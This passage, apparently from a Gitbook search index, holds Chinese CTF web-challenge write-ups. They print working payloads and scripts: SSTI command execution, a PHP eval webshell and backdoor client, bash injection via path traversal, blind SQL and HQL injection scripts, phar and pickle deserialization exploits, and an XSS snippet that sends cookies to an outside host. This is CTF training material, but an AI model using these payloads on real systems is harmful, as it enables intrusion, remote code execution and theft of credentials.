'Error, no backdoor response' cmd = raw_input('phpshell > ') continue output = output[0] debugPrint(output) output = output.decode('base64') output = loopXor(output,xorKey) output = zlib.decompress(output) print output cmd = raw_input('phpshell > ') 注意是phpshell 用system(\"cat fl*\") phpshell > system(\"cat fl*\"); 拿到flag 参考资料 Nginx配置安全: https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html 文中的php后门分析https://www.cnblogs.com/go2bed/p/5920811.html © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/web_python_template_injection.html":{"url":"adworld/web_python_template_injection.html","title":"Web_python_template_injection","keywords":"","body":"Web_python_template_injection参考资料Web_python_template_injection 基础模板注入 试一下 /{{1+1}} 返回了 URL http://111.198.29.45:40527/2 not found 发现可以用chrome hackbar扩展自带的ssti模板直接注入 /{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }} 返回 URL http://111.198.29.45:40527/fl4g index.py not found 读一下/fl4g就可 {{ config.__class__.__init__.__globals__['os'].popen('cat%20fl4g').read() }} 参考资料 Flask/Jinja2 SSTI && python 沙箱逃逸：https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-沙箱逃逸/) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/wtf.sh-150.html":{"url":"adworld/wtf.sh-150.html","title":"wtf.sh-150","keywords":"","body":"wtf.sh-150参考资料wtf.sh-150 网站使用.wtf的奇怪后缀文件名写的 /post.wtf?post=nBp9N 有传参，fuzz一下 存在路径穿透 poc=/post.wtf?post=../ 可以看到有源码泄露 太多了，CRTL+F直接看看有没有flag source user_functions.sh $ if contains 'user' ${!URL_PARAMS[@]} && file_exists \"users/${URL_PARAMS['user']}\" $ then $ local username=$(head -n 1 users/${URL_PARAMS['user']}); $ echo \"${username}'s posts:\"; $ echo \"\"; $ get_users_posts \"${username}\" | while read -r post; do $ post_slug=$(awk -F/ '{print $2 \"#\" $3}' $(nth_line 2 \"${post}\" | htmlentities)\"; $ done $ echo \"\"; $ if is_logged_in && [[ \"${COOKIES['USERNAME']}\" = 'admin' ]] && [[ ${username} = 'admin' ]] $ then $ get_flag1 $ fi $ fi 可以看到如果我们获得了admin的登录态，就会拿到flag1 那么我们搜一下user相关源码看看 cp -R /opt/wtf.sh /tmp/wtf_runtime; # protect our stuff chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.wtf; chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.sh; chmod 777 /tmp/wtf_runtime/wtf.sh/; # set all dirs we could want to write into to be owned by www # (We don't do whole webroot since we want the people to be able to create # files in webroot, but not overwrite existing files) chmod -R 777 /tmp/wtf_runtime/wtf.sh/posts/; chown -R www:www /tmp/wtf_runtime/wtf.sh/posts/; chmod -R 777 /tmp/wtf_runtime/wtf.sh/users/; chown -R www:www /tmp/wtf_runtime/wtf.sh/users/; chmod -R 777 /tmp/wtf_runtime/wtf.sh/users_lookup/; chown -R www:www /tmp/wtf_runtime/wtf.sh/users_lookup/; # let's get this party started! su www -c \"/tmp/wtf_runtime/wtf.sh/wtf.sh 8000\"; 可以看到，存在users/ users_lookup/文件夹，利用路径穿透读一下 返回了 Posted by admin ae475a820a6b5ade1d2e8b427b59d53d15f1f715 uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w== 结合之前泄露的源码 function hash_password { local password=$1; (shasum /dev/null; } function find_user_file { local username=$1; local hashed=$(hash_username \"${username}\"); local f; if [[ -n \"${username}\" && -e \"users_lookup/${hashed}\" ]] then echo \"users/$(cat \"users_lookup/${hashed}/userid\")\"; else echo \"NONE\"; # our failure case -- ugly but w/e... fi; return; } # The caller is responsible for checking that the user doesn't exist already calling this function create_user { local username=$1; local password=$2; local hashed_pass=$(hash_password ${password}); local hashed_username=$(hash_username \"${username}\"); local token=$(generate_token); mkdir users 2> /dev/null; # make sure users directory exists touch users/.nolist; # make sure that the users dir can't be listed touch users/.noread; # don't allow reading of user files directly mkdir users_lookup 2> /dev/null; # make sure the username -> userid lookup directory exists touch users_lookup/.nolist; # don't let it be listed local user_id=$(basename $(mktemp users/XXXXX)); # user files look like: # username # hashed_pass # token echo \"${username}\" > \"users/${user_id}\"; echo \"${hashed_pass}\" >> \"users/${user_id}\"; echo \"${token}\" >> \"users/${user_id}\"; mkdir \"users_lookup/${hashed_username}\" 2> /dev/null; touch \"users_lookup/${hashed_username}/.nolist\"; # lookup dir for this user can't be readable touch \"users_lookup/${hashed_username}/.noread\"; # don't allow reading the lookup dir touch \"users_lookup/${hashed_username}/posts\"; # lookup for posts this user has participated in echo \"${user_id}\" > \"users_lookup/${hashed_username}/userid\"; # create reverse lookup echo ${user_id}; } function check_password { local username=$1; local password=$2; local userfile=$(find_user_file ${username}); if [[ ${userfile} = 'NONE' ]] then return 1; fi local hashed_pass=$(hash_password ${password}); local correct_hash=$(head -n2 ${userfile} | tail -n1); [[ ${hashed_pass} = ${correct_hash} ]]; return $?; } function is_logged_in { contains 'TOKEN' ${!COOKIES[@]} && contains 'USERNAME' ${!COOKIES[@]}; local has_cookies=$?; local userfile=$(find_user_file ${COOKIES['USERNAME']}); [[ ${has_cookies} \\ && ${userfile} != 'NONE' \\ && $(tail -n1 ${userfile} 2>/dev/null) = ${COOKIES['TOKEN']} \\ && $(head -n1 ${userfile} 2>/dev/null) = ${COOKIES['USERNAME']} \\ ]]; return $?; } function get_users_posts { local username=$1; local hashed=$(hash_username \"${username}\"); # we only have to iterate over posts a user has replied to while read -r post_id; do echo \"posts/${post_id}\"; done 应该就是admin的# username # hashed_pass # token 根据 is_logged_in的逻辑，把cookie里面的token和username替换掉就可以了 用burp抓包修改之 GET /profile.wtf?user=jlvfK HTTP/1.1 Host: 111.198.29.45:52494 Pragma: no-cache Cache-Control: no-cache DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w== Connection: close HTTP/1.1 200 OK Content-Type: text/html X-Powered-By: wtf.sh 0.0.0.0.1 \"alphaest of bets\" X-Bash-Fact: Loops are just commands. So, you can pipe things into and out of them! 注意这里的user参数是通过访问admin的个人页面拿到的 Flag: xctf{cb49256d1ab48803 拿到了flag的一半， 另一半在哪呢，再对源码进行审计 考虑到create_user()里我们往服务器上写了一个文件，并且其中用户名一段是可控的，假如我们可以在这里注入恶意代码并解析成功，说不定就能getshell啥的 搜一下include function include_page { # include_page local pathname=$1 local cmd=\"\" [[ \"${pathname:(-4)}\" = '.wtf' ]]; local can_execute=$?; page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] then local line; while read -r line; do # check if we're in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf [[ \"$\" = \"${line:0:1}\" && ${can_execute} = 0 ]]; is_script=$?; # execute the line. if [[ $is_script = 0 ]] then cmd+=$'\\n'\"${line#\"$\"}\"; else if [[ -n $cmd ]] then eval \"$cmd\" || log \"Error during execution of ${cmd}\"; cmd=\"\" fi echo $line fi done Max include depth exceeded!\" fi } （格式化这东西还真是费劲。。。。 也就是说，他只会解析.wtf为后缀的并且前缀为$的文件，之前那个存用户信息的文件是不行了。。。。 还有什么地方可以自己注信息到服务器上呢， 看看post和reply这两个地方 function reply { local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username \"${username}\"); curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1); next_reply_id=$(awk '{print $1+1}' \"${next_file}\"; echo \"RE: $(nth_line 2 > \"${next_file}\"; echo \"${text}\" >> \"${next_file}\"; # add post this is in reply to to posts cache echo \"${post_id}/${next_reply_id}\" >> \"users_lookup/${hashed}/posts\"; } 这里的next_file文件后缀是可控的，next_file=(posts/${post_id}/${next_reply_id}); 我们只需要修改post_id就可以了,而post_id是存在路径穿越的，所以可以构造 POST /reply.wtf?post=../users_lookup/eval.wtf%09 HTTP/1.1 Host: 111.198.29.45:52494 Content-Length: 20 Cache-Control: max-age=0 Origin: http://111.198.29.45:52494 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://111.198.29.45:52494/reply.wtf?post=K8laH Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: USERNAME=eki; TOKEN=S7m+g2qcq8KjmzxWw18y2y+oe+Af+vL9Z3ezUFkCQgD8fFDykwwHrRxe/KJblUe3wc3VlgVcbpne4sf7fyHeRg== Connection: close text=124&submit=true 为什么是/users_lookup/因为fuzz后发现这个目录下没有.noread，所以可以放后门文件并被解析 提交后发现 /users_lookup/eval.wtf 可以访问了 现在我们只要注册一个$开头的用户名，就可任意执行脚本了 比如${find,/,-iname,flag} POST /reply.wtf?post=../users_lookup/eval.wtf%09 HTTP/1.1 Host: 111.198.29.45:52494 Content-Length: 19 Cache-Control: max-age=0 Origin: http://111.198.29.45:52494 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://111.198.29.45:52494/reply.wtf?post=K8laH Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: USERNAME=${find,/,-iname,*flag*}; TOKEN=JlsevcdXD47AijOfmE2zFRoBilmKOfrvpMQ31UqcHk79Zdn3enB+jlJx/GGEquu010Pm9IwjccE7G1lKPRzYUw== Connection: close text=123421&submit= 找到了 /usr/bin/get_flag2 和get_flag1一样执行一下 POST /reply.wtf?post=../users_lookup/eval.wtf%09 HTTP/1.1 Host: 111.198.29.45:52494 Content-Length: 16 Cache-Control: max-age=0 Origin: http://111.198.29.45:52494 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://111.198.29.45:52494/reply.wtf?post=K8laH Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: USERNAME=$/usr/bin/get_flag2; TOKEN=05GPW8uS2zpg1hCjm1nTcGQ0at/zDT6V4rGHCN7TFn/NeNv3ZqIge4FHJ7QJC4dpNj6hNsdQdZYyizJq2UPP5g== Connection: close text=233&submit= 拿到后半部分 Flag: 149e5ec49d3c29ca} 参考资料 bash中各种符号命令的解释：https://www.cnblogs.com/lsgxeva/p/11024165.html © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/zhuanxv.html":{"url":"adworld/zhuanxv.html","title":"Zhuanxv","keywords":"","body":"Zhuanxv参考资料Zhuanxv 题目地址： https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4682&page=2 看到JSESSIONID,得知是java写的web应用, 所以想办法读取配置文件web.xml gobuster 扫到/list css中获取图片方法 /loadimage?fileName=web_login_bg.jpg 看是否有LFI 关键是WEB-INF目录 WEB-INF目录的作用 /WEB-INF/web.xml Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/ 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。 /WEB-INF/lib/ 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。 /WEB-INF/src/ 源码目录，按照包名结构放置各个Java文件。 /WEB-INF/database.properties 数据库配置文件 /WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：。 /WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。 WEB-INF/jsp2/ 与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。 META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务manifest.mf文件，在用jar打包时自动生成。 ———————————————— 版权声明：本文为CSDN博主「meijory」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/meijory/article/details/53573140 拿到web.xml Struts Blank struts2 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter struts2 /* /ctfpage/index.jsp 404 /ctfpage/404.html 发现用的是Struct2框架 读一下struct.xml loadimage?fileName=../../WEB-INF/classes/struts.xml /ctfpage/login.jsp /ctfpage/welcome.jsp image/jpeg attachment;filename=\"bg.jpg\" downloadFile /ctfpage/welcome.jsp execute /ctfpage/login.jsp /ctfpage/welcome.jsp /ctfpage/welcome.jsp 根据action里的信息下载对应源码 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class public class DownloadAction extends ActionSupport { ... public InputStream getDownloadFile() throws Exception { return ServletActionContext.getServletContext().getResourceAsStream(\"/ctfpage/images/\" + this.fileName); } public String execute() throws Exception { String suffix = this.fileName.substring(this.fileName.lastIndexOf(\".\") + 1); if (!suffix.equals(\"xml\") && !suffix.equals(\"jpg\") && !suffix.equals(\"class\")) { return \"suffix_error\"; } return \"success\"; } ... } 可以看到只允许下载.xml，.jpg，.class文件 在UserLoginAction.class public boolean isValid(String username) { String valiidateString = \"[a-zA-Z0-9]{1-16}\"; return matcher(valiidateString, username); } 看到username只能1-16数字字母,无法注入，password试了一下万能密码也不行.... 关键我们还是不知道后台登陆是怎么查数据库的... 刚才的点fuzz一下还可找到另个文件applicationContext.xml Spring的核心配置文件 com.mysql.jdbc.Driver jdbc:mysql://localhost:3306/sctf user.hbm.xml org.hibernate.dialect.MySQLDialect true PROPAGATION_REQUIRED PROPAGATION_REQUIRED,readOnly 泄露出更多的class名称 可以看到之前的isValid并没有使用 //waf 注意只进行了password_matcher.find() public List loginCheck(String name, String password) { name = name.replaceAll(\" \", \"\"); name = name.replaceAll(\"=\", \"\"); Matcher username_matcher = Pattern.compile(\"^[0-9a-zA-Z]+$\").matcher(name); Matcher password_matcher = Pattern.compile(\"^[0-9a-zA-Z]+$\").matcher(password); if (password_matcher.find()) { return this.userDao.loginCheck(name, password); } return null; } //HQL语句 public class UserDaoImpl extends HibernateDaoSupport implements UserDao { public List findUserByName(String name) { return getHibernateTemplate().find(\"from User where name ='\" + name + \"'\"); } public List loginCheck(String name, String password) { return getHibernateTemplate().find(\"from User where name ='\" + name + \"' and password = '\" + password + \"'\"); } } 这里要进行HQL注入 无空格->/**/或换行符(不知道为啥这里的/**/不行换换行符就可了...) 无等号->or''like''或者‘1’>'0' 根据表达式从右至左结合的规则有payload user.name='or''like''or''like'&user.password=1 -> from User where name =''or''like''or''like'' and password = '1' 或 user.name=admin'or'1'>'0'or%0Aname%0Alike'admin&user.password=1 -> from User where name ='admin'or'1'>'0'or name like'admin' and password = '1' 成功登陆后台，但是没啥用....页面是写死的。。。。 这里要用到布尔盲注.... payload1中控制是否成功登陆的是第一个条件 利用''like''来爆破字段 写脚本 # payload=\"user.name=admin'or(select%0aascii(substr(welcometoourctf,1,1))from%0aFlag%0a)like'115'or%0aname%0alike'admin&user.password=1\" #coding=utf-8 from pwn import * import requests url=\"http://111.198.29.45:53297/zhuanxvlogin\" flag =\"\" for i in range(1,50): for c in range(30,150): ch = chr(c) if ch == '_' or ch == '%': continue sql=\"(select\\nascii(substr(welcometoourctf,\" + str(i) + \",1))\\nfrom\\nFlag\\n)\" username = \"admin'or\" + sql + \"like'\" + str(c) + \"'or\\nname\\nlike'admin\" password = \"1\" data = {\"user.name\" : username , \"user.password\" : password} #print data req = requests.post(url,data=data,timeout=10000).text if len(req) > 4000: flag = flag +ch print (\"Flag:\"+flag) break 很奇怪的是不知道为啥必须要用ascii码来like,并且要用第二个payload来组装数据 关于welcometoourctf和Flag是哪来的 还记得之前的list吗 public class AdminAction extends ActionSupport { private String pathName; public String execute() throws Exception { if (this.pathName == null) { return \"list_error\"; } travelDirectory(this.pathName); return \"success\"; } public void setPathName(String pathName) { this.pathName = pathName; } public void travelDirectory(String directory) { List fileList = new ArrayList(); File dir = new File(directory); if (dir.isFile()) return; File[] files = dir.listFiles(); ActionContext actionContext = ActionContext.getContext(); Map request = (Map)actionContext.get(\"request\"); if (files != null) { for (int i = 0; i 可以读目录,fuzz一下，在 list?pathName=/opt/tomcat/webapps/ROOT/WEB-INF/classes 下找到user.hbm.xml 参考资料 struct2 action详解: https://blog.csdn.net/bestmy/article/details/81068026 大佬的wp: https://www.guildhab.top/?p=648 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/":{"url":"buuoj/","title":"BUUOJ","keywords":"","body":"BUUOJBUUOJ 地址: https://buuoj.cn/challenges 提供了好多赛题的复现 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/suctf-2019.html":{"url":"buuoj/suctf-2019.html","title":"SUCTF 2019","keywords":"","body":"SUCTF 20190x01 Checkin参考资料0x09 [SUCTF 2019]Pythonginx参考资料SUCTF 2019 0x01 Checkin 00 0a后缀无法绕过。 文件头监测使用GIF89a 内容过滤 文件夹下有index.php，提示利用.user.ini写图片马 GIF89a auto_prepend_file=233.gif GIF89a @eval($_REQUSET['eki']); 用蚁剑连上，或者直接写system(\"cat \\flag\") 参考资料 user.ini文件构成的PHP后门 https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 0x09 [SUCTF 2019]Pythonginx @app.route('/getUrl', methods=['GET', 'POST']) def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" 这里利用的是\"idna\"编码解码的问题 suctf.c℆ -> suctf.cc/u 利用file://协议读文件，提示了nginx 配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx file://suctf.c℆sr/local/nginx/conf/nginx.conf -> server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } } file://suctf.c℆sr/fffffflag 参考资料 nginx重要目录： https://www.jianshu.com/p/e64539590865 Unicode vulnerabilities: https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/ciscn-northeast-2019.html":{"url":"buuoj/ciscn-northeast-2019.html","title":"CISCN 2019 华北赛区","keywords":"","body":"[CISCN2019 华北赛区 Day1]0x01 Web1 Dropbox0x02 [CISCN2019 华北赛区 Day1 Web2]ikun0x03 [CISCN2019 华北赛区 Day2 Web1]Hack WorldWeb4 CyberPunk[CISCN2019 华东北赛区]Web2[CISCN2019 华北赛区 Day1] 0x01 Web1 Dropbox 注册登陆，可以上传图片 抓包可以发现下载没有检验 存在任意下载漏洞 fuzz一下在../../拿到源码 //download.php open($filename) && stristr($filename, \"flag\") === false) { Header(\"Content-type: application/octet-stream\"); Header(\"Content-Disposition: attachment; filename=\" . basename($filename)); echo $file->close(); } else { echo \"File not exist\"; } ?> 这里过滤了flag，可能flag就在这里了 找一下有没有文件包含的地方 class File { public $filename; public function open($filename) { $this->filename = $filename; if (file_exists($filename) && !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this->filename); } public function size() { $size = filesize($this->filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size >= 1024 && $i filename); } public function close() { return file_get_contents($this->filename);#执行close的时候会调用file_get_contents } } ?> 看一下哪里执行了close()并且可以利用 注意 //download.php ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); 这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。 //delete.php open($filename)) { $file->detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" => true, \"error\" => \"\"); echo json_encode($response); } else { Header(\"Content-type: application/json\"); $response = array(\"success\" => false, \"error\" => \"File not exist\"); echo json_encode($response); } ?> 通过User调用File中的close()读取flag但是要经FileList绕一下，不然没有回显 无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个'close'与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList->close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user->__destruct() => $db->close() => $db->__call('close') => $file->close() => $results=file_get_contents($filename) => FileList->__destruct()输出$result。 作者：天水麒麟儿_ 链接：https://www.jianshu.com/p/5b91e0b7f3ac 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 构造Exp filename = \"/flag.txt\"; $this->files = array($file); } } $a = new User(); $a->db = new FileList(); $phar = new Phar(\"exp.phar\"); //后缀名必须为phar $phar->startBuffering(); $phar->setStub(\"\"); //设置stub $o = new User(); $o->db = new FileList(); $phar->setMetadata($a); //将自定义的meta-data存入manifest 使用phar://会调用其反序列化 $phar->addFromString(\"exp.txt\", \"test\"); //添加要压缩的文件（不是利用点 //签名自动计算 $phar->stopBuffering(); ?> 0x02 [CISCN2019 华北赛区 Day1 Web2]ikun 提示拿lv6,找lv6的账号 import requests url=\"http://102b7304-c0d2-43a8-9304-0bf80beb692e.node3.buuoj.cn/shop?page=\" for i in range(0,2000): r=requests.get(url+str(i)) if 'lv6.png' in r.text: print (i) break 写个多线程的脚本 购买的时候抓包可以看到折扣和价格，修改拿到lv6 给了一个目录/b1g_m4mber 提示该页面，只允许admin访问 这里涉及到对JWT的修改 首先利用工具爆破JWT的密钥 这里用的是c-jwt-cracker 得到1Kun jwt.io生成对应token 拿到www.zip admin.py里有段代码 become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) 这里涉及到pickle,python中的序列化对象，可以与php中的相类比 这里我们可以写一个恶意类打包成pickle上传即可 import pickle import urllib class Eval(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",)) a = pickle.dumps(Eval()) a = urllib.quote(a) print a __reduce__(self) 当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）； 0x03 [CISCN2019 华北赛区 Day2 Web1]Hack World #,--,...被过滤 但是1/1 0 拿源码分析 考虑利用if语句 if(ascii(substr((select(flag)from(flag),1,1))=102,1,2) /*if(exp1,exp2,exp3) 如果exp1为真 返回exp2,否则返回exp3 */ #coding=utf-8 import requests url=\"http://73afb379-fd87-4c44-a0e8-bb5742cc8d48.node3.buuoj.cn/index.php\" flag=\"\" #payload=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2) for i in range(1,50): for c in range(30,155): payload=\"if((ascii(substr((select\\nflag\\nfrom\\nflag),\"+str(i)+\",1)))=\"+str(c)+\",1,2)\" data={\"id\":payload} #print data req=requests.post(url,data=data).text if (len(req)==312): flag=flag+chr(c) print \"Flag:\"+flag break 也可以利用‘>’二分法(判断开闭区间)找 #coding=utf-8 import requests url=\"http://73afb379-fd87-4c44-a0e8-bb5742cc8d48.node3.buuoj.cn/index.php\" flag=\"\" #payload=if(ascii(substr((select(flag)from(flag)),1,1))\"+str(mid)+\",1,2)\" data={\"id\":payload} #print chr(mid) req=requests.post(url,data=data).text if (len(req)==312): l=mid else : r=mid flag=flag+chr(r) print \"Flag:\"+flag Web4 CyberPunk 好吧，源代码里有注释提示file参数 LFI拿到项目源码 curl http://d045b903-f060-43e5-95e9-c9d77fd9c94d.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=index.php | head -n 1 |base64 -d > index.php 可以看到这里有很明显的二次注入 //confrim.php $user_name = $_POST[\"user_name\"]; $address = $_POST[\"address\"];//直接没过滤 $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db->query($sql); } if($fetch->num_rows>0) { $msg = $user_name.\"已提交订单\"; }else{ $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\"; $re = $db->prepare($sql); $re->bind_param(\"sss\", $user_name, $address, $phone); $re = $re->execute(); if(!$re) { echo 'error'; print_r($db->error); exit; } $msg = \"订单提交成功\"; } //change.php $address = addslashes($_POST[\"address\"]);//单引号转义 但是存入数据库的时候的时候存的还是普通单引号 $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db->query($sql); } if (isset($fetch) && $fetch->num_rows>0){ $row = $fetch->fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];//这里直接拼接$address和之前的$row['address'],存在二次注入 $result = $db->query($sql); if(!$result) { echo 'error'; print_r($db->error);//可以利用报错注入 exit; } $msg = \"订单修改成功\"; } else { $msg = \"未找到订单!\"; } 我们直接构造报错注入试试 先注入，再更新触发 poc:1' where `user_id`=updatexml(1,concat(1,(database())),1)# -> errorXPATH syntax error: 'ctfusers' 然后就是找flag在哪了。。。。 找了半天跟我说要load_file？？？？？ 好吧。。。证明sql题flag不一定在库里 payload:1' where `user_id`=updatexml(1,concat(1,(select load_file('/flag.txt'))),1)# [CISCN2019 华东北赛区]Web2 很明显的XSS题了，可以写页面，可以反馈给bot。 怎么绕waf呢 第一步通过eval(xss)的方式绕过 然后waf对于()等的绕过通过HTMLMarkUp的方式绕过 Poc: xss =\"alert('123');\" output = \"\" for ch in xss: output += \"&#\" + str(ord(ch)) print(\"eval&#40&#34\" + output + \"&#34&#41\") 然后直接塞xss平台上的代码好像不行，有个CSP (function(){(new Image()).src='http://xss.buuoj.cn/index.php?do=api&id=U3widY&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})(); if(''==1){keep=new 